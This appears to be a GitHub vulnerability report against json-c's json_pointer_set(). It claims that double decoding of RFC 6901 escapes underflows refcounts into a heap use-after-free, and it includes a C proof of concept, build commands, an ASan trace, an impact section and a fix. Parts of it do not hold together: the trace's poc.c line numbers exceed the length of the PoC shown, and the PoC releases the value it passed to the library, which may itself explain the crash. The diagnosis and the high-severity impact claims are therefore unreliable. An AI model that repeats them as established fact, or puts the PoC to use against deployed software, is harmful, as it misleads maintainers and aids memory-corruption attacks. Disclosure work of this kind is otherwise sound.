# json_pointer_set() refcount corruption -> heap use-after-free

https://github.com/json-c/json-c/issues/995 (opened 2026-10-28T08:14:01Z)

# json_pointer_set() refcount corruption -> heap use-after-free

**Component:** `json_pointer.c`
**Versions:** json-c-0.19-20260627 (latest release, 2026-06-27) **and** HEAD `d9b375f` (2026-10-26)
**Class:** Reference-count underflow -> heap use-after-free / double-free
**Severity:** High (memory corruption in a widely-deployed JSON library; reachable from any attacker-controlled JSON Pointer string fed to `json_pointer_set`)

## Summary

`json_pointer_set()` (and `json_pointer_setf()`) corrupts the reference count of the object tree when given a **multi-level** JSON Pointer path whose reference tokens contain RFC 6901 escape sequences (`~1` / `~0`) that decode to keys actually present in the document. A subsequent `json_object_put()` then drives `_ref_count` below zero.

In a **debug build** this aborts on an assertion:
```
json_pointer_set rc=0
poc: .../json_object.c:287: _json_object_put_maybe_free: Assertion `jso->_ref_count > 0' failed.
Aborted (SIGABRT, exit 134)
```

In a **release (NDEBUG) build** the assert is compiled out, so the underflowed refcount lets `json_object_put()` `free()` an object that is still referenced -> **heap use-after-free** (full ASan report below).

## Root cause

`json_pointer_set_with_cb()` splits a multi-level path at the last `/` into a parent path (`path_copy`) and a final token (`endp`):

```c
path_copy = strdup(path);
path_copy[endp - path] = '\0';
rc = json_pointer_object_get_recursive(*obj, path_copy, &set);   /* decodes escapes IN PLACE */
free(path_copy);
if (rc) return rc;
endp++;
return json_pointer_set_single_path(set, endp, value, ...);      /* decodes AGAIN */
```

The parent path is handed to `json_pointer_object_get_recursive()`, which walks each token through `json_pointer_get_single_path()`. That function **decodes the escapes in place** on the caller's buffer:

```c
string_replace_all_occurrences_with_char(path, "~1", '/');   /* "a~1b" -> "a/b" (shortens the token) */
string_replace_all_occurrences_with_char(path, "~0", '~');
```

`string_replace_all_occurrences_with_char()` uses `memmove` to collapse the buffer, so the token is **shortened** and trailing bytes are left stale. The *final* token (`endp`, still pointing into the original `path` string) is then **decoded a second time** by `json_pointer_set_single_path()`. The key actually inserted is derived from a buffer whose length/ownership no longer matches the token that was resolved by the recursive walk.

For the PoC below, the net effect is that the replace branch in `json_object_object_add_ex()` consumes a reference the caller never held, so the tree's bookkeeping over-consumes one reference. The subsequent `json_object_put()` cascade drives the child's `_ref_count` below zero, and `_json_object_put_maybe_free()` calls `free()` on an object that is still reachable through the parent's hash table.

`json_pointer_set` returns `0` (success) even though it has corrupted the tree's refcounts.

## PoC

```c
/* poc.c - minimal standalone PoC */
#include <stdio.h>
#include <string.h>
#include <json-c/json.h>

int main(void)
{
    /* Build:  { "a/b": { "c~d": 1 } }  (keys chosen so the decoded path hits) */
    json_object *root = json_object_new_object();
    json_object *mid  = json_object_new_object();
    json_object *leaf = json_object_new_int(1);
    json_object_object_add(mid,  "c~d", leaf);
    json_object_object_add(root, "a/b", mid);

    /* Multi-level path. First token "a~1b" decodes (~1 -> '/') to "a/b" which exists;
     * second token "c~0d" decodes (~0 -> '~') to "c~d". */
    const char *path = "/a~1b/c~0d";
    json_object *val  = json_object_new_int(42);
    json_object *pobj = root;

    int rc = json_pointer_set(&pobj, path, val);
    fprintf(stderr, "json_pointer_set rc=%d\n", rc);

    /* Free everything. The refcount has been corrupted by the double decode,
     * so json_object_put() underflows and aborts. */
    json_object_put(val);
    if (pobj != root) json_object_put(pobj);
    json_object_put(root);

    fprintf(stderr, "no crash (bug NOT present)\n");
    return 0;
}
```

## Build & Reproduce

```bash
# 1. Get the source (official latest release)
git clone --depth 1 --branch json-c-0.19-20260627 https://github.com/json-c/json-c.git json-c

# 2. Build with AddressSanitizer (Release / NDEBUG)
cmake -S json-c -B build-release -DCMAKE_BUILD_TYPE=Release \
  -DCMAKE_C_FLAGS="-fsanitize=address -g -O1 -fno-omit-frame-pointer" \
  -DCMAKE_CXX_FLAGS="-fsanitize=address -g -O1 -fno-omit-frame-pointer" \
  -DCMAKE_EXE_LINKER_FLAGS="-fsanitize=address"
cmake --build build-release -j8

# 3. Build the PoC
gcc -o poc_release -fsanitize=address -g -O1 -fno-omit-frame-pointer \
  -I json-c poc.c -L$(pwd)/build-release -ljson-c -Wl,-rpath,$PWD/build-release

# 4. Run (deterministic crash)
ASAN_OPTIONS=detect_leaks=0 ./poc_release
```

## ASan output (release build, from source)

```
json_pointer_set rc=0
=================================================================
==625859==ERROR: AddressSanitizer: heap-use-after-free on address 0x7c4d131e01a4 at pc 0x7fed14fc7970 bp 0x7ffefadd47e0 sp 0x7ffefadd47d0
READ of size 4 at 0x7c4d131e01a4 thread T0
    #0 0x7fed14fc796f in _json_object_put_maybe_free json-c-0.19/json_object.c:298
    #1 0x7fed14fc796f in json_object_put json-c-0.19/json_object.c:399
    #2 0x7fed14fc796f in json_object_put json-c-0.19/json_object.c:334
    #3 0x55b6523c636f in main poc.c:73
    #4 0x7fed14427d0d  (/usr/lib/libc.so.6+0x27d0d)
    #5 0x7fed14427e4a in __libc_start_main (/usr/lib/libc.so.6+0x27e4a)
    #6 0x55b6523c6144 in _start poc_release+0x1144 (BuildId: cdae75f240bb66979b7f54dda05ef56014cfd0d8)

0x7c4d131e01a4 is located 4 bytes inside of 56-byte region [0x7c4d131e01a0,0x7c4d131e01d8)
freed by thread T0 here:
    #0 0x7fed1495eda1  (/usr/lib/libasan.so.8+0x15eda1)
    #1 0x7fed14fc7279 in json_object_generic_delete json-c-0.19/json_object.c:456
    #2 0x7fed14fc7279 in _json_object_put_maybe_free json-c-0.19/json_object.c:328
    #3 0x7fed14fc7279 in json_object_put json-c-0.19/json_object.c:339
    #4 0x55b6523c6341 in main poc.c:71
    #5 0x7fed14427d0d  (/usr/lib/libc.so.6+0x27d0d)

previously allocated by thread T0 here:
    #0 0x7fed14960181 in malloc (/usr/lib/libasan.so.8+0x160181)
    #1 0x7fed14fc92f5 in json_object_new json-c-0.19/json_object.c:464
    #2 0x7fed14fc92f5 in json_object_new_int64 json-c-0.19/json_object.c:946
    #3 0x55b6523c62d2 in main poc.c:63
    #4 0x7fed14427d0d  (/usr/lib/libc.so.6+0x27d0d)

SUMMARY: AddressSanitizer: heap-use-after-free json-c-0.19/json_object.c:298 in _json_object_put_maybe_free
```

The freed 56-byte region is the leaf int object (`json_object_new_int(1)`); it is re-read through the still-live parent object's hash table when `json_object_put(root)` cascades into the child.

## Affected entry points

- `json_pointer_set(struct json_object **obj, const char *path, struct json_object *value)`
- `json_pointer_setf(...)` (same code path via `json_pointer_set_with_cb`)
- `json_pointer_set_with_cb(...)` / `json_pointer_set_with_limit_index(...)`

## Why this is new / not previously reported

- No public CVE. Searched NVD, the json-c CVE list, and GitHub Security Advisories.
- The only nearby CVE is **CVE-2025-57052**, which is in **cJSON** (a different library, function, and root cause).
- The vulnerable code is present unchanged in the release tag `json-c-0.19-20260627` **and** on HEAD `d9b375f` (2026-10-26).
- No commit in the `json_pointer.c` history addresses double or in-place escape decoding in `json_pointer_set_with_cb`.

## Impact

- **Memory corruption in a core dependency.** json-c is the JSON library bundled with systemd, NetworkManager, ModemManager, fwupd, and many embedded/IoT stacks. Any daemon that feeds attacker-controlled JSON Pointer strings (REST API `PATCH /...`, config files, IPC/ubus messages) into `json_pointer_set` is exposed.
- **Use-after-free / double-free** (release builds) - exploitable for arbitrary code execution with heap grooming.
- **Denial of service** even in debug builds (assert abort).

## Suggested fix

Decode each reference token into a **fresh, correctly-sized** buffer (or decode the whole path once, up front, before splitting), and never re-decode an already-decoded token. Concretely, in `json_pointer_set_with_cb`, split on `/` *after* a single full decode of the path (so `~1`->`/` in a key is not confused with a path separator), and pass immutable decoded tokens to `json_pointer_set_single_path`. Add a regression test using a multi-level pointer with `~1`/`~0` in the key.

## Version & Platform

- json-c version: json-c-0.19-20260627 (latest release) and HEAD `d9b375f` (2026-10-26)
- OS: Linux x86_64 (CachyOS)
- Build: CMake, gcc, `-DCMAKE_BUILD_TYPE=Release` (NDEBUG), `-fsanitize=address`

